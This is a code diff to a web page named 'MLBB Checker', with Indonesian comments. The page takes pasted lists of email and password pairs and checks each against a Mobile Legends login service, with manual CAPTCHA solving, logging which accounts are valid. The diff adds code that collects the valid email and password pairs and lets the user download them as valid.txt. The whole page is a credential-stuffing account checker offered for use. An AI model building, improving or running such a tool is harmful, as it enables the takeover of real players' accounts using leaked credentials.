@@ -20,7 +20,7 @@
 <h2>MLBB Checker By Arif Hidayatulloh Manual Captcha</h2>
 <p>Paste list akun (email|password per baris). Untuk tiap akun akan muncul CAPTCHA manual. Hasil langsung muncul di log.</p>
 
-<textarea id="combo" placeholder="user1@example.com|Pass123\nuser2@example.com:Pass456"></textarea>
+<textarea id="combo" placeholder="user1@example.com|Pass123&#10;user2@example.com:Pass456"></textarea>
 <br>
 <button id="startBtn">Start Checking</button>
 <button id="stopBtn" disabled>Stop</button>
@@ -39,6 +39,7 @@ let combos = [];
 let currentIndex = 0;
 let stopRequested = false;
 let neCaptchaInstance = null;
+let validAccounts = []; // simpan hasil valid sesi
 
 const logEl = document.getElementById("log");
 const statusEl = document.getElementById("status");
@@ -56,18 +57,22 @@ function appendLog(text, cls) {
 }
 
 function parseCombos(text) {
-  return text.split(/\r?\n/).map(l => l.trim()).filter(Boolean).map(line => {
-    if(line.includes("|")) {
-      const [e,p] = line.split("|",2);
-      return { email: e.trim(), password: p.trim() };
-    } else if(line.includes(":")) {
-      const [e,p] = line.split(":",2);
-      return { email: e.trim(), password: p.trim() };
-    } else {
-      appendLog(`Format salah dan dilewati: ${line}`, "info");
-      return null;
-    }
-  }).filter(Boolean);
+  return text.split(/\r?\n/)
+    .map(l => l.trim())
+    .filter(Boolean)
+    .map(line => {
+      if(line.includes("|")) {
+        const [e,p] = line.split("|",2);
+        return { email: e.trim(), password: p.trim() };
+      } else if(line.includes(":")) {
+        const [e,p] = line.split(":",2);
+        return { email: e.trim(), password: p.trim() };
+      } else {
+        appendLog(`Format salah dan dilewati: ${line}`, "info");
+        return null;
+      }
+    })
+    .filter(Boolean);
 }
 
 function showCaptchaOnce() {
@@ -147,6 +152,7 @@ async function checkOneAccount(account) {
 
     if(data.code === 0 && data.data) {
       appendLog(`VALID => ${account.email} | GUID: ${data.data.guid || "N/A"}`, "ok");
+      validAccounts.push(`${account.email}|${account.password}`);
     } else if(data.code === 1004) {
       appendLog(`NOT FOUND => ${account.email}`, "bad");
     } else if(data.code === 1005) {
@@ -170,6 +176,7 @@ async function startProcess() {
   startBtn.disabled = true;
   stopBtn.disabled = false;
   logEl.innerHTML = "";
+  validAccounts = [];
   combos = parseCombos(document.getElementById("combo").value);
 
   if(combos.length === 0) {
@@ -190,11 +197,8 @@ async function startProcess() {
     const acc = combos[currentIndex];
     await checkOneAccount(acc);
 
-    // Hapus akun yang sudah dicek dari combos dan update textarea
     combos.splice(currentIndex, 1);
     updateTextareaCombos();
-
-    // Jangan increment currentIndex karena array sudah berkurang
   }
 
   appendLog("Selesai", "info");
@@ -203,14 +207,26 @@ async function startProcess() {
   stopBtn.disabled = true;
 }
 
+// Event tombol
 startBtn.addEventListener("click", startProcess);
 stopBtn.addEventListener("click", () => {
   stopRequested = true;
   stopBtn.disabled = true;
 });
 
+// Download hanya hasil valid di sesi ini
 downloadBtn.addEventListener("click", () => {
-  window.open(WORKER_URL + "/download", "_blank");
+  if(validAccounts.length === 0) {
+    appendLog("Tidak ada akun valid untuk diunduh", "info");
+    return;
+  }
+  const blob = new Blob([validAccounts.join("\n")], { type: "text/plain" });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement("a");
+  a.href = url;
+  a.download = "valid.txt";
+  a.click();
+  URL.revokeObjectURL(url);
 });
 </script>
 
